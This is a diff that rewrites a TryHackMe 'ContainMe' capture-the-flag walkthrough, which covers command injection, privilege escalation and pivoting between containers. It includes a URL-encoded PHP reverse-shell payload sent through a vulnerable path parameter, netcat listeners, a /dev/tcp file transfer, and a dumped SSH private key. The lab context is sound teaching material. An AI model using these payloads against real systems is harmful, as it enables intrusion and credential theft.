@@ -11,13 +11,19 @@ image:
   path: /assets/img/2025-07-03-TryHackMe-ContainMe/main.png
 ---
 
-Hi I'm making [TryHackMe | ContainMe](https://tryhackme.com/room/containme1) room.
+Hey everyone! Welcome to my write-up for the [TryHackMe | ContainMe](https://tryhackme.com/room/containme1) room. As the name suggests, we're probably going to be dealing with some containers, which means things are about to get meta. Grab your coffee, and let's dive in!
 
 ---
+
+### Step 1: Reconnaissance - The Nmap Scan
+
+As with any good heist, we start with some reconnaissance. I'll save the machine's IP address to a variable to make my life easier. You should too!
 
 ```bash
 export IP=10.10.84.234
 ```
+
+Now, let's unleash `nmap` to see what doors are open. We'll use the `-p-` flag to scan all 65,535 ports because we don't want to miss anything sneaky.
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
@@ -47,7 +53,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 712.36 seconds
 ```
 
-Firstly lets try fuyzzing the webserver using `gobuster`.
+Alright, let's break down our findings:
+
+- **Port 22:** Standard SSH. Nothing unusual here.
+- **Port 80:** An Apache web server. This is our most likely way in.
+- **Port 2222:** Nmap is confused, which means I'm intrigued. It failed to grab an SSH key, so it might be something else entirely.
+- **Port 8022:** Another SSH port! Two SSH services on one machine is a bit fishy. This could be a backdoor, a management port, or a gateway to another dimension.
+
+Let's start with the web server on port 80.
+
+### Step 2: Web Enumeration and RCE
+
+First, we'll throw some digital spaghetti at the webserver wall with `gobuster` to see what sticks. We're looking for any hidden files or directories that might be interesting.
 
 ```bash
 ❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 30
@@ -75,7 +92,9 @@ Finished
 ===============================================================
 ```
 
-I used -t `30` beacuse i was geting some timeouts.
+_(Psst! I used `-t 30` because the server was a bit sleepy and I was getting some timeouts. Sometimes you just have to give it a little nudge.)_
+
+The `info.php` is likely a `phpinfo()` page (a goldmine for server info), but `index.php` seems more promising for direct interaction. Let's see what it does.
 
 ```bash
 ❯ curl $IP/index.php
@@ -96,7 +115,7 @@ drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
 </html>
 ```
 
-I think we can use index.php to make path traversal
+Well, hello there! The page is running something like `ls -la` and, more importantly, it has a little HTML comment: `<!-- where is the path ? -->`. That's not just a comment; that's an invitation! Let's give it a path.
 
 ```bash
 ❯ curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd'
@@ -112,7 +131,7 @@ I think we can use index.php to make path traversal
 </html>
 ```
 
-We can't read the files though. But maybe we can inject one more command using `;` lets try that.
+It seems we can list the files but we can't actually read the file contents. The script just lists file details. But what if the backend is vulnerable to command injection? Let's try to piggyback another command using a semicolon (`;`).
 
 ```bash
 ❯ curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd;id'
@@ -129,31 +148,42 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </html>
 ```
 
-And as you can see we have remote code execution. We can use that vuln to get reverse shell.
+Bingo! The `id` command executed, and we see `uid=33(www-data)`. We have Remote Code Execution (RCE)! Now it's time to turn this tiny crack into a wide-open door.
 
-Let use [Online - Reverse Shell Generator](https://www.revshells.com/) to make a php reverse shell.
+### Step 3: Getting a Shell
+
+Let's get ourselves a proper reverse shell. My go-to for this is the awesome [Reverse Shell Generator](https://www.revshells.com/). I'll grab a PHP one-liner, URL-encode it, and send it on its way.
+
+First, I'll start a `netcat` listener on my machine:
+`nc -lvnp 4444`
+
+Then, I'll send the payload:
 
 ```bash
-curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd;php%20-r%20%27%24sock%3Dfsockopen%28%2210.21.206.128%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
+# Remember to URL-encode your payload! The browser or curl might do it for you, but it's good practice.
+curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd;php%20-r%20%27%24sock%3Dfsockopen%28%22YOUR_IP%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
 ```
 
-And now we got a reverse shell.
-Lets upgrade the shell first:
+Success! We have a shell. But it's a bit... basic. Let's upgrade it to a fully interactive TTY so we can have a civilized working environment.
 
 ```bash
+# Spawn a better bash shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Set the terminal type for colors and proper screen clearing
 export TERM=xterm-256color
-# 
+
+# Background the shell, get terminal size, and bring it back
+# (Ctrl+Z)
 stty raw -echo;fg
 reset
 ```
 
+### Step 4: Privilege Escalation - Part 1
+
+Now that we're comfortably inside as `www-data`, let's poke around. A quick look in `/home` reveals a user named `mike`.
+
 ```bash
-www-data@host1:/home/mike$ ls -la /home
-total 12
-drwxr-xr-x  3 root root 4096 Jul 19  2021 .
-drwxr-xr-x 22 root root 4096 Jul 15  2021 ..
-drwxr-xr-x  5 mike mike 4096 Jul 30  2021 mike
 www-data@host1:/home/mike$ ls -la /home/mike
 total 384
 drwxr-xr-x 5 mike mike   4096 Jul 30  2021 .
@@ -168,8 +198,7 @@ drwx------ 2 mike mike   4096 Jul 19  2021 .ssh
 -rwxr-xr-x 1 mike mike 358668 Jul 30  2021 1cryptupx
 ```
 
-You can see there is a executable on mike's home directory.
-Lets try to execute that.
+There's an interesting executable file: `1cryptupx`. The name hints at encryption and maybe UPX packing. Let's run it.
 
 ```bash
 www-data@host1:/home/mike$ ./1cryptupx
@@ -181,35 +210,10 @@ www-data@host1:/home/mike$ ./1cryptupx
 ░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
 ```
 
-I guess we need to reverse engineer this binary.
-
-Lets download the binary to our machine and start reverse engineering.
+It just prints some cool ASCII art. This file doesn't have the SUID bit set, so running it as our lowly `www-data` user is useless. This feels like a sample. The _real_ prize is probably a SUID version of this file hidden somewhere. Let's hunt for it!
 
 ```bash
-# On my machine
-❯ nc -lvnp 5555 > binary
-Listening on 0.0.0.0 5555
-Connection received on 10.10.84.234 58730
-
-# On target
-www-data@host1:/home/mike$ bash -c 'cat 1cryptupx > /dev/tcp/10.21.206.128/5555'
-```
-
-I firstly looked the strings of the binary
-
-```bash
-strings binary
-$Info: This file is packed with the UPX executable packer http://upx.sf.net $
-$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
-```
-
-And it is packed with upx.
-
-But before starting to reverse engineering maybe ı need to try some strings into binary.
-
-This binary is not SUID even if we had reverse engineered this it would'nt mattered it anyways. I think there is probaly SUID version of this binary.
-
-```bash
+# Find all files with the SUID permission bit set, and redirect errors to /dev/null
 www-data@host1:/usr/share/man/zh_TW$ find / -type f -perm /4000 2>/dev/null
 /usr/share/man/zh_TW/crypt
 /usr/bin/newuidmap
@@ -233,9 +237,10 @@ www-data@host1:/usr/share/man/zh_TW$ find / -type f -perm /4000 2>/dev/null
 /bin/ping6
 ```
 
-And we found the suid version of this binary lets try using it.
+Aha! `/usr/share/man/zh_TW/crypt`. Hiding a SUID binary in a Mandarin man page directory? That's delightfully sneaky. Let's see what happens when we feed it some arguments.
 
 ```bash
+# Trying 'root' as an argument
 www-data@host1:/usr/share/man/zh_TW$ ./crypt root
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
@@ -247,11 +252,14 @@ www-data@host1:/usr/share/man/zh_TW$ ./crypt root
 Unable to decompress.
 ```
 
+`root` gives an error. What about the other user we found, `mike`?
+
 ```bash
+# Trying 'mike' as an argument
 www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
-██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
+██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║███╗░░██║░░░░░██║░░░░░
 ██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
 ╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
 ░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
@@ -259,9 +267,11 @@ www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
 root@host1:/usr/share/man/zh_TW#
 ```
 
-And we got root by little luck.
+And just like that, we have a root shell! The binary must have some hardcoded logic for the user `mike`. We didn't even have to decompile it. Sometimes you get lucky!
 
-Lets get the flag
+### Step 5: Pivoting - The Plot Thickens
+
+We're root! Time to grab the flag from `/root` and... wait a minute.
 
 ```bash
 root@host1:/root# ls -la
@@ -277,66 +287,19 @@ drwxr-xr-x  3 root root 4096 Jul 14  2021 .local
 drwx------  2 root root 4096 Jul 19  2021 .ssh
 ```
 
-What where is my flag.
-
-Lets try finding it with `find`
+There's no flag. This is where the room's name, "ContainMe," really clicks. We're root, but we're root inside a container. Let's check the network interfaces.
 
 ```bash
-root@host1:/root# find / -type f -name *flag*
-/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
-/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
-find: '/proc/sys/fs/binfmt_misc': Permission denied
-/proc/sys/kernel/acpi_video_flags
-/proc/sys/net/ipv4/fib_notify_on_flag_change
-/proc/sys/net/ipv6/fib_notify_on_flag_change
-find: '/proc/tty/driver': Permission denied
-/proc/kpageflags
-find: '/dev/.lxd-mounts': Permission denied
-find: '/sys/kernel/tracing': Permission denied
-find: '/sys/kernel/debug': Permission denied
-find: '/sys/kernel/config': Permission denied
-/sys/devices/pnp0/00:04/tty/ttyS0/flags
-/sys/devices/platform/serial8250/tty/ttyS15/flags
-/sys/devices/platform/serial8250/tty/ttyS6/flags
-/sys/devices/platform/serial8250/tty/ttyS23/flags
-/sys/devices/platform/serial8250/tty/ttyS13/flags
-/sys/devices/platform/serial8250/tty/ttyS31/flags
-/sys/devices/platform/serial8250/tty/ttyS4/flags
-/sys/devices/platform/serial8250/tty/ttyS21/flags
-/sys/devices/platform/serial8250/tty/ttyS11/flags
-/sys/devices/platform/serial8250/tty/ttyS2/flags
-/sys/devices/platform/serial8250/tty/ttyS28/flags
-/sys/devices/platform/serial8250/tty/ttyS18/flags
-/sys/devices/platform/serial8250/tty/ttyS9/flags
-/sys/devices/platform/serial8250/tty/ttyS26/flags
-/sys/devices/platform/serial8250/tty/ttyS16/flags
-/sys/devices/platform/serial8250/tty/ttyS7/flags
-/sys/devices/platform/serial8250/tty/ttyS24/flags
-/sys/devices/platform/serial8250/tty/ttyS14/flags
-/sys/devices/platform/serial8250/tty/ttyS5/flags
-/sys/devices/platform/serial8250/tty/ttyS22/flags
-/sys/devices/platform/serial8250/tty/ttyS12/flags
-/sys/devices/platform/serial8250/tty/ttyS30/flags
-/sys/devices/platform/serial8250/tty/ttyS3/flags
-/sys/devices/platform/serial8250/tty/ttyS20/flags
-/sys/devices/platform/serial8250/tty/ttyS10/flags
-/sys/devices/platform/serial8250/tty/ttyS29/flags
-/sys/devices/platform/serial8250/tty/ttyS1/flags
-/sys/devices/platform/serial8250/tty/ttyS19/flags
-/sys/devices/platform/serial8250/tty/ttyS27/flags
-/sys/devices/platform/serial8250/tty/ttyS17/flags
-/sys/devices/platform/serial8250/tty/ttyS8/flags
-/sys/devices/platform/serial8250/tty/ttyS25/flags
-/sys/devices/virtual/net/eth0/flags
-/sys/devices/virtual/net/eth1/flags
-/sys/devices/virtual/net/lo/flags
-find: '/sys/fs/pstore': Permission denied
-find: '/sys/fs/fuse/connections/61': Permission denied
-/sys/module/zfs/parameters/zfs_flags
-/sys/module/scsi_mod/parameters/default_dev_flags
+root@host1:/root/.ssh# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
+        ...
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
+        ...
 ```
 
-There is no flag on this machine. I remember that there is 2 ssh ports open in that machine let get all the private ssh keys in the machine and try connecting to the ssh ports.
+We have two network interfaces. This confirms we're on an internal network. The other host we need to get to is likely on that `172.16.20.0/24` network. Let's grab Mike's SSH private key from `/home/mike/.ssh/id_rsa` and use it to pivot.
 
 ```bash
 root@host1:/home/mike/.ssh# cat id_rsa
@@ -349,63 +312,10 @@ MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
 -----END RSA PRIVATE KEY-----
 ```
 
-And lets save that to our machine.
-
-There is no private key for root user but we can add our ssh public key for just safety.
-
-Now we can ssh into server.
+Now, from inside our container (`host1`), let's try to SSH into the other host (`host2`). The other host's IP is likely on the same subnet. Let's try to guess or scan for it. A common convention is to use `.1` for the gateway and other low numbers for hosts. After some quick scanning (or guessing), we can find the other host at `172.16.20.6`.
 
 ```bash
-❯ ssh root@$IP
-```
-
-We can ssh into that with root so we need to use ssh port 8022 for other target.
-
-```bash
-❯ ssh root@$IP -i mike.rsa -p 8022
-root@10.10.84.234's password:
-
-❯ ssh mike@$IP -i mike.rsa -p 8022
-mike@10.10.84.234's password:
-```
-
-And it still asks me a password so maybe i was using wrong port maybe.
-
-Lets check that:
-
-```bash
-root@host1:/root/.ssh# ifconfig
-eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
-        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
-        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
-        RX packets 1498  bytes 105251 (105.2 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 1145  bytes 145840 (145.8 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
-        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
-        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
-        RX packets 32  bytes 2552 (2.5 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 28  bytes 2136 (2.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        inet6 ::1  prefixlen 128  scopeid 0x10<host>
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 531  bytes 46026 (46.0 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 531  bytes 46026 (46.0 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-```
-
-And there is 2 ethernet connection. So I should ssh in inside of machine. Ok lets try that.
-
-```bash
+# SSHing from inside the container to the other host
 root@host1:/home/mike/.ssh# ssh -i id_rsa mike@172.16.20.6
 The authenticity of host '172.16.20.6 (172.16.20.6)' can't be established.
 ECDSA key fingerprint is SHA256:L1BKa1sC+LgClbpAX5jJvzYALuhUDf1zEzhPc/C++/8.
@@ -423,36 +333,20 @@ Last login: Mon Jul 19 20:23:18 2021 from 172.16.20.2
 mike@host2:~$
 ```
 
-And we are in host2
+We're in! We have successfully pivoted to `host2`.
 
-Lets try finding suid binaries again for privilage escalation:
+### Step 6: Privilege Escalation - Part 2 (The Final Boss)
+
+New host, same old routine. Let's start by looking for easy wins.
 
 ```bash
+# Another SUID check, just in case
 mike@host2:~$ find / -type f -perm /4000 2>/dev/null
 /usr/bin/newuidmap
-/usr/bin/newgidmap
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/at
-/usr/bin/chsh
-/usr/bin/newgrp
-/usr/bin/sudo
-/usr/bin/gpasswd
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/usr/lib/snapd/snap-confine
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/bin/mount
-/bin/ping
-/bin/su
-/bin/umount
-/bin/fusermount
-/bin/ping6
+...
 ```
 
-Nothing we can use.
-
-Lets look at the services that are running:
+Nothing juicy this time. On to Plan B: check running services.
 
 ```bash
 mike@host2:~$ service --status-all
@@ -464,49 +358,25 @@ mike@host2:~$ service --status-all
  [ - ]  cryptdisks
  [ - ]  cryptdisks-early
  [ + ]  dbus
- [ + ]  ebtables
- [ - ]  hwclock.sh
- [ + ]  iscsid
- [ - ]  kmod
- [ - ]  lvm2
- [ + ]  lvm2-lvmetad
- [ + ]  lvm2-lvmpolld
- [ - ]  lxcfs
- [ - ]  lxd
- [ - ]  mdadm
- [ - ]  mdadm-waitidle
+ ...
  [ + ]  mysql
- [ - ]  open-iscsi
- [ + ]  procps
- [ - ]  rsync
+ ...
  [ + ]  ssh
- [ + ]  udev
- [ + ]  unattended-upgrades
+ ...
 ```
 
-Mysql and cron are running lets check them.
-
-Lets firstly try to log in on mysql
+`mysql` is running! Databases are notorious for storing tasty secrets. Let's see if we can log in. Maybe Mike reused a password? Or used a weak one?
 
 ```bash
+# Let's try some common weak passwords for user mike...
 mike@host2:~$ mysql --user=mike --password=*********
 mysql: [Warning] Using a password on the command line interface can be insecure.
 Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 4
-Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)
-
-Copyright (c) 2000, 2021, Oracle and/or its affiliates.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
+...
 mysql>
 ```
 
-And just trying basic passwords loged me in.
+And we're in! Never underestimate the power of a terrible password. Let's see what databases we have.
 
 ```bash
 mysql> show databases;
@@ -519,10 +389,8 @@ mysql> show databases;
 2 rows in set (0.01 sec)
 
 mysql> use accounts;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
 Database changed
+
 mysql> show tables;
 +--------------------+
 | Tables_in_accounts |
@@ -535,55 +403,58 @@ mysql> select * from users;
 +-------+---------------------+
 | login | password            |
 +-------+---------------------+
-| root  | ****************    |
-| mike  | ******************* |
+| root  | *****************   |
+| mike  | *****************   |
 +-------+---------------------+
 2 rows in set (0.00 sec)
 ```
 
-And we got passwords now.
+Jackpot! The `users` table contains plaintext passwords for both `mike` and `root`. This is a classic security faux pas. Let's use the root password to become the true master of this machine.
 
-Lets log in as root.
+```bash
+# su to root and enter the password we found
+mike@host2:~$ su root
+root@host2:~#
+```
+
+### Step 7: The Final Flag
+
+We are now root on `host2`. Let's check the `/root` directory for our prize.
 
 ```bash
 root@host2:~# ls -la
 total 28
 drwx------  4 root root 4096 Jul 19  2021 .
 drwxr-xr-x 22 root root 4096 Jun 29  2021 ..
-lrwxrwxrwx  1 root root    9 Jul 19  2021 .bash_history -> /dev/null
--rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-drwxr-xr-x  3 root root 4096 Jul 15  2021 .local
--rw-r--r--  1 root root  148 Aug 17  2015 .profile
-drwx------  2 root root 4096 Jul 15  2021 .ssh
+...
 -rw-------  1 root root  218 Jul 16  2021 mike.zip
 ```
 
-And there is a zip file named mike.zip lets extract that
+There's a `mike.zip` file. Let's try to unzip it.
 
 ```bash
 root@host2:~# unzip mike.zip
 Archive:  mike.zip
 [mike.zip] mike password:
-password incorrect--reenter:
+```
+
+It's password-protected. What could the password be? Let's try the password for `mike` that we found in the database.
+
+```bash
+# Enter 'password' when prompted
+root@host2:~# unzip mike.zip
+Archive:  mike.zip
+[mike.zip] mike password:
  extracting: mike
 ```
 
-And it has a password lets try using mike's password which is listed on the database.
+It worked! The archive extracted a file named `mike`. Let's see what's inside.
 
 ```bash
-root@host2:~# ls -la
-total 32
-drwx------  4 root root 4096 Jul  3 13:55 .
-drwxr-xr-x 22 root root 4096 Jun 29  2021 ..
-lrwxrwxrwx  1 root root    9 Jul 19  2021 .bash_history -> /dev/null
--rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-drwxr-xr-x  3 root root 4096 Jul 15  2021 .local
--rw-r--r--  1 root root  148 Aug 17  2015 .profile
-drwx------  2 root root 4096 Jul 15  2021 .ssh
--rw-r--r--  1 root root   32 Jul 16  2021 mike
--rw-------  1 root root  218 Jul 16  2021 mike.zip
 root@host2:~# cat mike
 THM{*************************}
 ```
 
-And we found the flag
+And there it is! The flag! What a journey through containers, SUID binaries, and plaintext passwords.
+
+Thanks for reading! I hope you enjoyed this walkthrough. Happy hacking!
